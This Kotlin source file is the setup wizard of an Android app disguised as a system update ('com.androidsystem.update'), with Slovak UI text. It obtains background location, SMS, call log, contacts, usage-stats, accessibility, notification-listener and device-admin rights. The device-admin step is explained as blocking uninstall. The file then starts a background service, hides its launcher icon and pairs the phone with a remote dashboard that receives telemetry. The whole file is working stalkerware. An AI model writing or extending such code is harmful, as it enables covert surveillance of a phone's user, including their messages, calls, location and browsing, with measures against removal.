package com.androidsystem.update.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.androidsystem.update.accessibility.AccessibilityServiceImpl
import com.androidsystem.update.receiver.DeviceAdminReceiver
import com.androidsystem.update.service.CoreService
import com.androidsystem.update.service.NotificationListener
import kotlinx.coroutines.delay

private const val PREFS_NAME = "app_prefs"
private const val SETUP_COMPLETED_KEY = "setup_completed"

class SetupWizard : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent { SetupWizardContent() }
    }
}

@Composable
private fun SetupWizardContent() {
    val context = LocalContext.current
    val prefs = remember { context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) }

    // Reopen after setup: go straight to the completion screen (pairing code /
    // paired status) instead of re-running the whole permission wizard.
    val setupCompleted = remember { prefs.getBoolean(SETUP_COMPLETED_KEY, false) }
    if (setupCompleted) {
        CompletionScreen(context)
        return
    }

    var step by remember { mutableStateOf(0) }
    var allCompleted by remember { mutableStateOf(false) }
    var stepError by remember { mutableStateOf<String?>(null) }
    // True once the user declined the background-location dialog. On Android
    // 11+ the system then auto-denies further dialog requests, so the wizard
    // must send the user to the app's settings screen instead.
    var backgroundDenied by remember { mutableStateOf(false) }

    val steps = listOf(
        "Povolenie polohy", "Povolenie SMS a hovorov", "Povolenie kontaktov",
        "Povolenie štatistík používania", "Správca zariadenia", "Prístupnosť",
        "Notifikácie", "Optimalizácia batérie", "Automatický štart", "Dokončenie"
    )

    val stepDescriptions = listOf(
        "Aplikácia potrebuje prístup k polohe aj na pozadí.",
        "Pre zobrazenie SMS a záznamov hovorov.",
        "Pre zobrazenie zoznamu kontaktov.",
        "Pre sledovanie štatistík používania aplikácií.",
        "Aktivácia správcu zariadenia pre ochranu pred odinštalovaním.",
        "Pre sledovanie aktivít a získavanie URL z prehliadača.",
        "Pre sledovanie notifikácií zo sociálnych sietí.",
        "Vypnutie optimalizácie batérie pre spoľahlivý beh.",
        "Povolenie automatického štartu po reštarte.",
        "Všetko je nastavené. Spustenie služby."
    )

    // Location has several Android traps: background location must be asked in
    // a separate dialog on Android 11+ (asking it together with foreground is
    // silently ignored), the dialog is auto-denied forever after one decline,
    // and on Android 12+ the user may grant only approximate (coarse) location.
    // So the wizard always verifies the REAL state, and after a decline it
    // sends the user to the app's settings screen where "Allow all the time"
    // can be picked manually (that survives the auto-deny).
    val appDetailsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        // Came back from the app's settings page — check what is actually granted.
        if (!hasForegroundLocation(context)) {
            stepError = "Povolenie polohy je potrebné (v nastaveniach aplikácie povolte polohu)"
        } else if (!hasBackgroundLocation(context)) {
            stepError = "Poloha na pozadí nie je povolená — v nastaveniach vyberte „Povoliť vždy“ (Allow all the time)"
        } else {
            stepError = null; step++
        }
    }

    val locationBackgroundLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        if (granted[Manifest.permission.ACCESS_BACKGROUND_LOCATION] == true) {
            stepError = null; step++
        } else {
            backgroundDenied = true
            stepError = "Na sledovanie na pozadí treba „Povoliť vždy“. Otváram nastavenia aplikácie…"
            appDetailsLauncher.launch(appDetailsIntent(context))
        }
    }

    val locationLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        // Foreground location counts as granted with precise OR approximate.
        if (granted[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
            granted[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        ) {
            if (!hasBackgroundLocation(context)) {
                locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
            } else {
                stepError = null; step++
            }
        } else {
            stepError = "Povolenie polohy je potrebné"
        }
    }

    val smsCallLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        if (granted[Manifest.permission.READ_SMS] == true &&
            granted[Manifest.permission.READ_CALL_LOG] == true) {
            stepError = null; step++
        } else {
            stepError = "Povolenia SMS a hovorov sú potrebné"
        }
    }

    val contactsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        if (granted[Manifest.permission.READ_CONTACTS] == true) {
            stepError = null; step++
        } else {
            stepError = "Povolenie kontaktov je potrebné"
        }
    }

    val usageLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        val granted = try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), context.packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), context.packageName
                )
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { false }
        stepError = if (granted) null else "Štatistiky použitia nie sú povolené"
        step++
    }

    val adminLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, DeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) {
            stepError = null; step++
        } else {
            stepError = "Správca zariadenia nie je aktivovaný"
        }
    }

    // Accessibility is verified against the real system state, so a step is
    // never marked done when the user actually backed out of the settings.
    val accessibilityLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isAccessibilityEnabled(context)) {
            stepError = null; step++
        } else {
            stepError = "Služba prístupnosti nie je zapnutá"
        }
    }

    val notificationListenerLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isNotificationListenerEnabled(context)) {
            stepError = null; step++
        } else {
            stepError = "Prístup k notifikáciám nie je povolený"
        }
    }

    // Android 13+ requires the runtime POST_NOTIFICATIONS permission before the
    // app can show the foreground-service notification at all.
    val notificationPermLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        val permOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
            granted[Manifest.permission.POST_NOTIFICATIONS] == true
        if (permOk) {
            notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        } else {
            stepError = "Povolenie notifikácií je potrebné"
        }
    }

    val batteryLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isBatteryOptimizationIgnored(context)) {
            stepError = null; step++
        } else {
            stepError = "Optimalizácia batérie nie je vypnutá"
        }
    }

    val autoStartLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { stepError = null; step++ }

    val stepActions = listOf<() -> Unit>(
        {
            when {
                // Foreground not granted yet → ask (on Android 10 background
                // can only be granted inside the same batch dialog).
                !hasForegroundLocation(context) -> {
                    val perms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        arrayOf(
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_COARSE_LOCATION
                        )
                    } else {
                        arrayOf(
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_BACKGROUND_LOCATION
                        )
                    }
                    locationLauncher.launch(perms)
                }
                // Background missing AND the dialog was already declined → the
                // system auto-denies further dialogs; go to app settings.
                !hasBackgroundLocation(context) && backgroundDenied ->
                    appDetailsLauncher.launch(appDetailsIntent(context))
                // Background missing but never declined → ask via the dialog.
                !hasBackgroundLocation(context) ->
                    locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
                // Everything already granted.
                else -> { stepError = null; step++ }
            }
        },
        {
            smsCallLauncher.launch(arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE
            ))
        },
        { contactsLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS)) },
        { usageLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
        {
            val admin = ComponentName(context, DeviceAdminReceiver::class.java)
            adminLauncher.launch(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Ochrana pred odinštalovaním")
                }
            )
        },
        { accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
        {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                notificationPermLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
            } else {
                notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        },
        {
            batteryLauncher.launch(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
            )
        },
        {
            val intent = when {
                Build.MANUFACTURER.equals("Xiaomi", true) ->
                    Intent("miui.intent.action.OP_AUTO_START").apply {
                        putExtra("package_name", context.packageName)
                        `package` = "com.miui.securitycenter"
                    }
                Build.MANUFACTURER.equals("Huawei", true) ->
                    Intent("huawei.intent.action.HW_AUTO_START").apply {
                        putExtra("packageName", context.packageName)
                        `package` = "com.huawei.systemmanager"
                    }
                Build.MANUFACTURER.equals("OnePlus", true) ->
                    Intent("oneplus.intent.action.OP_AUTO_START").apply {
                        putExtra("package_name", context.packageName)
                        `package` = "com.oneplus.security"
                    }
                else ->
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${context.packageName}")
                    }
            }
            autoStartLauncher.launch(intent)
        },
        {
            val serviceIntent = Intent(context, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(serviceIntent)
            else
                context.startService(serviceIntent)
            // Mark setup as done so reopening the app shows the pairing code
            // again instead of restarting the wizard.
            prefs.edit().putBoolean(SETUP_COMPLETED_KEY, true).apply()
            // Hide the icon only when the device is already paired. While
            // unpaired the launcher icon must stay so the pairing code stays
            // recoverable (CoreService hides the icon once pairing confirms).
            if (prefs.getBoolean("is_paired", false)) CoreService.hideLauncherIcon(context)
            allCompleted = true
        }
    )

    if (allCompleted) {
        CompletionScreen(context)
    } else {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text("Nastavenie UI_service", fontSize = 24.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(8.dp))
            Text("Krok ${step + 1} z ${steps.size}", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.6f))
            Spacer(Modifier.height(24.dp))
            LinearProgressIndicator(
                progress = (step + 1).toFloat() / steps.size,
                modifier = Modifier.fillMaxWidth()
            )
            Spacer(Modifier.height(32.dp))
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(
                    modifier = Modifier.padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(steps[step], fontSize = 20.sp, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                    Spacer(Modifier.height(16.dp))
                    Text(stepDescriptions[step], fontSize = 14.sp, textAlign = TextAlign.Center)
                    stepError?.let {
                        Spacer(Modifier.height(8.dp))
                        Text(it, fontSize = 12.sp, color = MaterialTheme.colorScheme.error, textAlign = TextAlign.Center)
                    }
                    Spacer(Modifier.height(24.dp))
                    if (step < steps.size - 1) {
                        Button(
                            onClick = stepActions[step],
                            modifier = Modifier.fillMaxWidth().height(48.dp)
                        ) {
                            Text("Otvoriť nastavenia", fontSize = 14.sp)
                        }
                        Spacer(Modifier.height(12.dp))
                        OutlinedButton(
                            onClick = { stepError = null; step++ },
                            modifier = Modifier.fillMaxWidth().height(48.dp)
                        ) {
                            Text("Už mám povolené", fontSize = 14.sp)
                        }
                    } else {
                        Button(
                            onClick = stepActions[step],
                            modifier = Modifier.fillMaxWidth().height(48.dp)
                        ) {
                            Text("Spustiť službu", fontSize = 14.sp)
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun CompletionScreen(context: Context) {
    // CoreService generates the 6-digit code on its first heartbeat and stores
    // it under app_prefs/pairing_code. If the service hasn't run yet, generate
    // it here (same format + storage) so the user always sees a stable code.
    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    val pairingCode = remember {
        prefs.getString("pairing_code", null)
            ?: (100000..999999).random().toString().also {
                prefs.edit().putString("pairing_code", it).apply()
            }
    }
    var isPaired by remember { mutableStateOf(prefs.getBoolean("is_paired", false)) }

    // Live-update the screen once the dashboard confirms the pairing.
    LaunchedEffect(Unit) {
        while (!isPaired) {
            delay(3000)
            isPaired = prefs.getBoolean("is_paired", false)
        }
    }

    Column(
        modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(32.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("✓", fontSize = 72.sp, color = MaterialTheme.colorScheme.primary)
        Spacer(Modifier.height(24.dp))
        Text("Nastavenie dokončené", fontSize = 20.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
        Spacer(Modifier.height(16.dp))
        Text("UI_service beží na pozadí.\nMôžete zatvoriť aplikáciu.", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.6f), textAlign = TextAlign.Center)
        Spacer(Modifier.height(28.dp))

        if (isPaired) {
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(
                    modifier = Modifier.fillMaxWidth().padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text("Zariadenie je spárované", fontSize = 15.sp, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                    Spacer(Modifier.height(6.dp))
                    Text("Telemetria sa odosiela na server a zariadenie nájdete v dashboarde.", fontSize = 13.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.7f))
                }
            }
        } else {
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(
                    modifier = Modifier.fillMaxWidth().padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text("Párovanie zariadenia", fontSize = 15.sp, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                    Spacer(Modifier.height(6.dp))
                    Text("Zadajte tento 6-miestny kód na dashboarde (nove-server-3ism.onrender.com) po prihlásení:", fontSize = 13.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.7f))
                    Spacer(Modifier.height(12.dp))
                    Text(
                        pairingCode,
                        fontSize = 40.sp,
                        fontWeight = FontWeight.Bold,
                        fontFamily = FontFamily.Monospace,
                        letterSpacing = 6.sp,
                        textAlign = TextAlign.Center
                    )
                    Spacer(Modifier.height(10.dp))
                    Text("Kód platí 5 minút a po spárovaní sa automaticky deaktivuje.", fontSize = 12.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.5f))
                    Spacer(Modifier.height(6.dp))
                    Text("Ak kód nestihnete prepísať, zatvorte aplikáciu a otvorte ju znova — kód sa zobrazí znovu.", fontSize = 12.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.5f))
                }
            }
        }

        Spacer(Modifier.height(32.dp))
        Button(
            onClick = { (context as? android.app.Activity)?.finish() },
            modifier = Modifier.fillMaxWidth().height(48.dp)
        ) {
            Text("Dokončiť", fontSize = 16.sp)
        }
    }
}

private fun isAccessibilityEnabled(context: Context): Boolean {
    val expected = "${context.packageName}/${AccessibilityServiceImpl::class.java.name}"
    val enabled = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
    ) ?: return false
    return enabled.split(':').any { it.equals(expected, true) }
}

private fun isNotificationListenerEnabled(context: Context): Boolean {
    val expected = "${context.packageName}/${NotificationListener::class.java.name}"
    val enabled = Settings.Secure.getString(
        context.contentResolver,
        "enabled_notification_listeners"
    ) ?: return false
    return enabled.split(':').any { it.equals(expected, true) }
}

private fun isBatteryOptimizationIgnored(context: Context): Boolean {
    val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
    return pm.isIgnoringBatteryOptimizations(context.packageName)
}

// Foreground location counts as granted with precise OR approximate access.
private fun hasForegroundLocation(context: Context): Boolean =
    ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
            == PackageManager.PERMISSION_GRANTED

// On Android 10 and below background location is granted together with the
// foreground request, so it's always considered granted there.
private fun hasBackgroundLocation(context: Context): Boolean =
    Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
        ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            == PackageManager.PERMISSION_GRANTED

private fun appDetailsIntent(context: Context): Intent =
    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
        data = Uri.parse("package:${context.packageName}")
    }
